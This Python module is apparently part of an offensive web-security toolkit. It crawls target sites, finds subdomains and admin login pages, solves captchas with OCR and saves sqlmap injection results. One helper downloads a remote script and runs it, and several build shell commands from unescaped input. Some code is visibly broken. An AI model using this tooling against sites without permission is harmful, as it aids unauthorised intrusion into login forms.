    #从url所在的html内容中收集url到url队列
    #返回值是一个字典,{'y1':y1,'y2':y2}
    #y1是根据参数url得到的html页面中的所有url,是个列表类型
    #y2是参数url对应的三个关键元素,y2是个字典类型,eg.{"code":200,"title":None,"content":""}
    #包括收集没有http_domain前缀的uri,src属性中的uri等
    #整理uri,暂时不做带参数的uri变成不带参数的页面
    #eg.http://www.baidu.com/nihao?a=1&b=2为http://www.baidu.com/nihao
    #后期可将带参数的uri根据参数fuzz,用于爆路径,发现0day等
    all_uris = []
    return_all_urls = []
    result = get_request(url)
    content = result['content']
    bs = BeautifulSoup(content, 'lxml')
    if re.match(r"%s/*((robots\.txt)|(sitemap\.xml))" % get_http_domain_pattern_from_url(url),url):
        #print content
        if re.search(r"(robots\.txt)$",url):
            #查找allow和disallow中的所有uri
            find_uri_pattern=re.compile(r"((Allow)|(Disallow)):[^\S\n]*(/[^?\*\n#]+)(/\?)?\s",re.I)
            find_uri=re.findall(find_uri_pattern,content)
            if find_uri:
                for each in find_uri:
                    all_uris.append(each[3])
            #查找robots.txt中可能存在的sitemap链接
            find_sitemap_link_pattern=re.compile(r"Sitemap:[^\S\n]*(http[\S]*)\s",re.I)
            find_sitemap_link=re.findall(find_sitemap_link_pattern,content)
            if find_sitemap_link:
                for each in find_sitemap_link:
                    all_uris.append(each)

        if re.search(r"(sitemap\.xml)$",url):
            find_url_pattern=re.compile(r'''(http(s)?://[^\s'"#<>]+).*\s''',re.I)
            find_url=re.findall(find_url_pattern,content)
            if find_url:
                for each in find_url:
                    all_uris.append(each[0])

    else:
        for each in bs.find_all('a'):
            #收集a标签(bs可以收集到不带http_domain的a标签)
            find_uri = each.get('href')
            if find_uri!=None:
                if re.match(r"^javascript:",find_uri):
                    continue
                else:
                    all_uris.append(find_uri)
        #收集src="http:..."中的uri
        for each in bs.find_all(src = True):
            find_uri = each.get('src')
            if find_uri!=None:
                all_uris.append(find_uri)


    #整理uri,将不带http_domain的链接加上http_domain
    for each in all_uris:
        if each is not None:
            if re.match(r"^http",each) is None:
                each = get_value_from_url(url)['y2'] + '/' + each
            if each not in return_all_urls:
                return_all_urls.append(each)
    #暂时不考虑将如http://www.baidu.com/1.php?a=1&b=2整理成http://www.baidu.com/1.php
    return {'y1':return_all_urls,'y2':result}

def like_admin_login_content(html):
    #根据html内容判断页面是否可能是管理员登录页面
    user_pass_form=get_user_and_pass_form_from_html(html)
    user_form_name=user_pass_form['user_form_name']
    pass_form_name=user_pass_form['pass_form_name']
    if user_form_name!=None and pass_form_name!=None:
        return True
    else:
        return False

def like_admin_login_url(url):
    #判断url对应的html内容是否可能是管理员登录页面
    html=get_request(url)['content']
    return like_admin_login_content(html)


class MyThread(threading.Thread):
    def __init__(self,func,args,name=''):
        threading.Thread.__init__(self)
        self.name=name
        self.func=func
        self.args=args
    def run(self):
        self.result=self.func(*self.args)
    def get_result():
        return self.result

def get_domain_key_value_from_url(url):
    #从url中得到域名的关键值
    #eg.从http://www.baidu.com中得到baidu
    url=re.sub(r"(\s)$","",url)
    http_domain=get_http_domain_from_url(url)
    domain=http_domain.split("//")[-1]
    num=len(domain.split("."))
    if num==2:
        return domain.split(".")[0]
    if num>2:
        if domain.split(".")[1] not in ['com','cn','org','gov','net','edu','biz','info','me','uk','hk','tw','us','it','in','fr','de','co','cc','cm','pro','br','tv']:
            return domain.split(".")[1]
        else:
            return domain.split(".")[0]

def crawl_url(url):
    #爬虫,可获取url对应网站的所有可抓取的url和所有网页三元素:code,title,content
    import config

    urls_queue=queue.Queue()
    urls_url_keyvalues={}
    #url和url的三个元素的对应值为一个字典的键值对
    #eg{'http://www.baiud.com':{'code':code,'title':title,'content':content},"":{},"":{},...}
    #用于收集url与对应的三个元素的值,收集后考虑可能统一存入数据库

    #收集相同域名网站内的urls
    domain_urls=[]
    resource_files=[]
    #收集二级域名
    subdomain_urls=[]
    def task_finish_func():
        while True:
            current_url=urls_queue.get()
            http_domain=get_http_domain_from_url(current_url)
            #eg.main_domain_prefix从http://www.freebuf.com中得到www
            #main_domain_key_value从http://www.freebuf.com中得到freebuf
            main_domain_prefix=re.search(r"http(s)?://([^\.]*)\.([^\./]*)",current_url).group(2)
            main_domain_key_value=re.search(r"http(s)?://([^\.]*)\.([^\./]*)",current_url).group(3)
            resource_file_pattern=re.compile(r"^http.*(\.(jpg)|(chm)|(jar)|(jpeg)|(gif)|(ico)|(bak)|(png)|(bmp)|(txt)|(doc)|(docx)|(pdf)|(txt)|(xls)|(xlsx)|(rar)|(zip)|(avi)|(mp4)|(rmvb)|(flv)|(m3u)|(msi)|(exe)|(com)|(pif)|(mp3)|(wav)|(mkv)|(7z)|(gz)|(htaccess)|(ini)|(xml)|(key)|(dll)|(css)|(cab)|(bin)|(js))$",re.I)
            result=collect_urls_from_url(current_url)
            code=result['y2']['code']
            title=result['y2']['title']
            content=result['y2']['content']
            if content is None:
                print("exist None value of content")
                continue
            auto_write_string_to_sql(current_url,config.db_name,config.all_targets_table_name,"urls","http_domain",http_domain)
            auto_write_string_to_sql(str(code),config.db_name,config.all_urls_table_name,"code","url",current_url)
            auto_write_string_to_sql(title,config.db_name,config.all_urls_table_name,"title","url",current_url)
            auto_write_string_to_sql(content,config.db_name,config.all_urls_table_name,"content","url",current_url)
            if like_admin_login_content(content)==True:
                auto_write_string_to_sql(current_url,config.db_name,config.all_targets_table_name,\
                                         "like_admin_login_urls","http_domain",http_domain)
                auto_write_string_to_sql(1,config.db_name,config.all_urls_table_name,"like_admin_login_url","url",current_url)
            else:
                auto_write_string_to_sql(0,config.db_name,config.all_urls_table_name,"like_admin_login_url","url",current_url)

            urls=result['y1']
            for each in urls:
                #collect_urls_from_url得到的结果中的元素可能是None
                if each is not None:
                    tmp=get_http_domain_pattern_from_url(http_domain)
                    http_domain_pattern=re.compile(r"%s" % tmp)
                    if re.match(http_domain_pattern,each):
                        each=re.sub(r"/$","",each)

                        if re.match(resource_file_pattern,each) and each not in resource_files:
                            #资源类型文件不放入任务队列里,直接写到数据库中
                            resource_files.append(each)
                            auto_write_string_to_sql(each,config.db_name,config.all_targets_table_name,\
                                                     "resource_files","http_domain",http_domain)
                        else:
                            if each not in domain_urls:
                                #print each
                                domain_urls.append(each)
                                #print domain_urls
                                urls_queue.put(each)
                    if re.match(r"http(s)?://[^\.]*(?<!%s)\.%s" % (main_domain_prefix,main_domain_key_value),each) \
                            and get_domain_key_value_from_url(each)==get_domain_key_value_from_url(current_url):
                        each_subdomain=get_http_domain_from_url(each)
                        if each_subdomain not in subdomain_urls:
                            #二级域名只将http_domain部分加入收藏,不放到队列里
                            #print each_subdomain
                            auto_write_string_to_sql(each_subdomain,config.db_name,config.all_targets_table_name,\
                                                     "sub_domains","http_domain",get_http_domain_from_url(current_url))
                            subdomain_urls.append(each_subdomain)
            #将所有结果存一份在字典中，暂时没有什么用
            urls_url_keyvalues['%s' % url]=result['y2']
            urls_queue.task_done()


    #初始化
    url=re.sub(r"(/{0,2}(\s){0,2})$","",url)
    http_domain=get_http_domain_from_url(url)
    start_urls=[url]
    if url!=http_domain:
        start_urls.append(http_domain)

    robots_txt_url=http_domain+"/robots.txt"
    result=get_request(robots_txt_url)
    if result['code']==200 and len(result['content'])>0:
        start_urls.append(robots_txt_url)
        content=result['content']
        strings_to_write="robots.txt exists,content is:\r\n"+content
        auto_write_string_to_sql(strings_to_write,config.db_name,config.all_targets_table_name,"robots_and_sitemap","http_domain",http_domain)

    sitemap_xml_url=http_domain+"/sitemap.xml"
    result=get_request(sitemap_xml_url)
    if result['code']==200 and len(result['content'])>0:
        start_urls.append(sitemap_xml_url)
        content=result['content']
        strings_to_write="sitemap.xml exists,content is:\r\n"+content
        auto_write_string_to_sql(strings_to_write,config.db_name,config.all_targets_table_name,"robots_and_sitemap","http_domain",http_domain)

    for each in start_urls:
        print(each)
        domain_urls.append(each)
        urls_queue.put(each)

    '''传统多线程
    mythreads=[]
    start=time.time()
    for i in range(15):
        mythread=MyThread(task_finish_func,())
        mythreads.append(mythread)
    for i in range(15):
        mythreads[i].setDaemon(True)
        mythreads[i].start()
        print("%s threads started" % str(i))
    urls_queue.join()
    end=time.time()
    print(end-start)
    print(len(domain_urls))
    #upon threads=200 ===> 38,16
    #threads=5 ===> 12,16
    #threads=10 4,16
    #threads=15 3.4,16
    '''

    '''单线程
    start=time.time()
    task_finish_func()
    urls_queue.join()
    end=time.time()
    print(end-start)
    print(len(domain_urls))
    #thread=1 task_finish_func中while True改成while urls_queue.empty() is False,要不然不会执行到最后     19.4,16
    '''

    mythreads=[]
    start=time.time()
    pool=ThreadPool(15)
    for i in range(15):
        #这里比较特殊,因为函数task_finish_func是个无限循环的函数,所以就算这里开20个线程也会因为线程池中只有15个位置使得一直只有15个线程在运行,多余的5个线程相当于没有设置一样
        pool.apply_async(task_finish_func,())
    pool.close()

    while 1:
        #这里的if取代下面的urls_queue.join(),有时爬虫被ban时,如果用urls_queue.join()会无限等待
        num_of_result=len(domain_urls)
        #实验中15s是较好的数据
        sleep(15)
        if len(domain_urls)==num_of_result:
            print("finished,if the number of urls you get is not big enough,you may be banned to crawl :(")
            break
    #urls_queue.join()
    end=time.time()
    print(end-start)
    print(len(domain_urls))
    #threads=15(pool_size=15,for_range=20) 4.15,16
    #threads=20(pool_size=20,for_range=20) 9.2,16
    #threads=10(pool_size=10,for_range=20) 4.2,16


def get_string_from_command(command):
    #执行命令并得到命令执行打印出的字符串,不会显示执行命令中的输出
    import subprocess
    return subprocess.getstatusoutput(command)[1]

def get_yanzhengma_from_pic(img, cleanup=True, plus=''):
    # 调用系统安装的tesseract来识别验证码
    # cleanup为True则识别完成后删除生成的文本文件
    # plus参数为给tesseract的附加高级参数
    #print get_string_from_yanzhengma('2.jpg')  # 打印识别出的文本,删除txt文件
    #print get_string_from_yanzhengma('2.jpg', False)  # 打印识别出的文本,不删除txt文件
    #print get_string_from_yanzhengma('2.jpg', False, '-l eng')  # 打印识别出的文本,不删除txt文件,同时提供高级参数
    command_output=get_string_from_command("which tesseract")
    if re.search(r'tesseract not found',command_output):
        os.system("wget https://raw.githubusercontent.com/3xp10it/mytools/master/install_tesseract.sh")
        os.system("chmod +x install_tesseract.sh")
        os.system("./install_tesseract.sh")
        os.system('tesseract ' + img + ' ' + img + ' ' + plus)  # 生成同名txt文件
    else:
        get_string_from_command('tesseract ' + img + ' ' + img + ' ' + plus)  # 生成同名txt文件

    text = file(img + '.txt').read().strip()
    if cleanup:
        os.remove(img + '.txt')
    return text


def get_string_from_url_or_picfile(url_or_picfile):
    #从url或图片文件中得到验证码,不支持jpeg,支持png
    from PIL import Image
    import ImageEnhance
    #from pytesseract import *
    from urllib.request import urlretrieve

    def get_pic_from_url(url,save_pic_name):
        #这里不打印wget的执行过程
        get_string_from_command("wget %s -O temp.png" % url)

    if url_or_picfile[:4]=="http":
        get_pic_from_url(url_or_picfile,'temp.png')
        im=Image.open("temp.png")
    else:
        im=Image.open(url_or_picfile)

    nx, ny = im.size
    im2 = im.resize((int(nx*5), int(ny*5)), Image.BICUBIC)
    im2.save("temp2.png")

    #下面这两句会在电脑上打开temp2.png
    #enh = ImageEnhance.Contrast(im)
    #enh.enhance(1.3).show("30% more contrast")
    string=get_yanzhengma_from_pic("temp2.png")
    get_string_from_command("rm temp.png temp2.png")
    return string

def mail_msg_to(msg,mailto,subject,user,password,format='plain'):
    #使用163的邮箱发送邮件
    #msg是要发送的string
    #mailto是发送的目标邮箱地址
    #subject是主题名
    #user,password是用户名密码,其中user要带上邮箱地址后缀

    import smtplib
    from email.mime.text import MIMEText
    from email.header import Header

    host='smtp.163.com'
    fromMail=user
    body=msg
    if isinstance(body,str) is True:
        body=str(body)
    me= ("%s<"+fromMail+">") % (Header('naruto','utf-8'),)
    msg = MIMEText(body,format,'utf-8')
    if not isinstance(subject,str):
        subject = str(subject)
    msg['Subject'] = subject
    msg['From'] = me
    msg['To'] = mailto
    msg["Accept-Language"]="zh-CN"
    msg["Accept-Charset"]="ISO-8859-1,utf-8"
    try:
        s = smtplib.SMTP()
        s.connect(host)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.set_debuglevel(3)
        s.login(user,password)
        s.sendmail(me, mailto, msg.as_string())
        s.quit()
        return True
    except Exception as e:
        print(str(e))
        return False

def get_input_intime(default_choose,timeout=5):
    #在一定时间内得到选择的值,如果没有选择则返回默认选择
    #第一个参数为默认选择值
    #第二个参数为设置超时后自动选择默认值的时间大小,单位为秒
    #返回选择的值,返回值是选择的值或是默认选择值,选择的值为str类型,默认的选择值可为任意类型
    import readline
    default_choose=[default_choose]
    timeout=[timeout]
    choosed=[0]
    chioce=['']
    def print_time_func():
        while choosed[0]==0 and timeout[0]>0:
            time.sleep(1)
            sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
            print("%s seconds left...please input your chioce:>" % timeout[0])
            sys.stdout.write('> ' + readline.get_line_buffer())
            sys.stdout.flush()
            timeout[0]-=1
        if choosed[0]==0:
            chioce[0]=default_choose[0]
    def input_func():
        while choosed[0]==0 and timeout[0]>0:
            s = input('> ')
            #rlist, _, _ = select([sys.stdin], [], [], timeout[0])

            if len(s)==0:
                chioce[0]=default_choose[0]
                choosed[0]=1
                print("you choosed the default chioce:%s" % default_choose[0])
            else:
                chioce[0]=s
                choosed[0]=1
                print("you choosed %s" % chioce[0])

    time_left_thread=MyThread(print_time_func,())
    input_thread=MyThread(input_func,())
    time_left_thread.start()
    #input_thread.setDaemon(True)
    input_thread.start()
    time_left_thread.join()
    if choosed[0]==0:
        print("i choose the default chioce for you:%s" % chioce[0])
    return chioce[0]

def checkvpn():
    #检测vpn是否连接成功
    import os
    import re
    #windows:-n 2
    #linux:-c 2
    a='ping www.google.com.hk -c 2'
    r=os.popen(a)
    output=r.readlines()
    #print output
    output="".join(output)
    p=re.compile(r'ttl=',re.I)
    if p.findall(output):
        #print "ok"
        return 1
    else:
        return 0

def get_source_domain_of_target_sqli_urls(url):
    #得到旁站所属的doamin
    import socket
    import re
    import os
    sqli_url_domain=re.sub(r'(https://)|(http://)|(\s)|(/.*)|(:.*)',"",url)

    targets_file=get_key_value_from_file("targets_file",'',os.getcwd()+'/sql_inject/targets.py')
    f=open(targets_file,"r+")
    targets_list=f.readlines()
    f.close()
    all_list=[]
    for each in targets_list:
        each=re.sub(r'(https://)|(http://)|(\s)|(/.*)|(:.*)',"",each)
        domain=[]
        domain.append(each)
        try:
            all_nics_ip=socket.gethostbyname_ex(each)[2]
            each_list=all_nics_ip+domain
            all_list.append(each_list)
        except:
            pass
    #print all_list
    for single_list in all_list:
        try:
            sqli_url_ip=socket.gethostbyname_ex(sqli_url_domain)[2]
            #print sqli_url_ip
            #print 55555555
            #print single_list
            if sqli_url_ip[0] in single_list:
                #print 66666666
                #print single_list[-1]
                return single_list[-1]
        except:
            pass
            return ""


def get_sqlmap_result_and_save_result(url):
    #得到sqlmap对url对应target的扫描结果,并将相关结果存入数据库
    #url可以是包含http形式的url，也可以是纯domain形式
    #py3
    url=re.sub(r"(\s)$","",url)
    if url[:4]=='http':
        import urllib.parse
        parsed=urllib.parse.urlparse(url)
        domain=parsed.hostname
    else:
        domain=url
    target_folder="/root/.sqlmap/output/"+domain
    try:
        f=open(target_folder+'/log',"r+")
        log=f.read()
        f.close()
    except:
        print("%s not exist" % target_folder)
        return ""
    find_payload_pattern=re.compile(r"Payload:.*",re.I)
    find_payload=re.findall(find_payload_pattern,log)
    if len(log)>0 and find_payload:
        payload_result=""
        return_payload=[]
        for each in find_payload:
            if each not in return_payload:
                return_payload.append(each)
        for each in return_payload:
            payload_result+=(each+'\n')
        payload_result=payload_result[:-1]

        with open(target_folder+'/target.txt',"r+") as f:
            domain_result=f.read()
            source_domain=get_source_domain_of_target_sqli_urls(url)
            save_result=domain_result+'\n'+payload_result+'\nsource domain:'+source_domain
            if source_domain[:4]=="http":
                http_domain=source_domain
            else:
                #这个import有可能会因为最开始有过import相同文件的动作而两次的文件不同,导致自己的罗辑错误
                #这里的import要求是有配置参数的config
                import config
                sql="select http_domain from %s where domain='%s'" % (config.all_targets_table_name,source_domain)
                sql_result=execute_sql_in_db(sql,config.db_name)
                http_domain=sql_result[0]

        auto_write_string_to_sql(sqlmap_result,config.db_name,config.all_targets_table_name,"sqlis","http_domain",http_domain)
        auto_write_string_to_sql(1,config.db_name,config.all_urls_table_name,"has_sqli","url",url)
        return save_result
    else:
        return ""

def auto_attack():
    #自动化检测流程
    pass
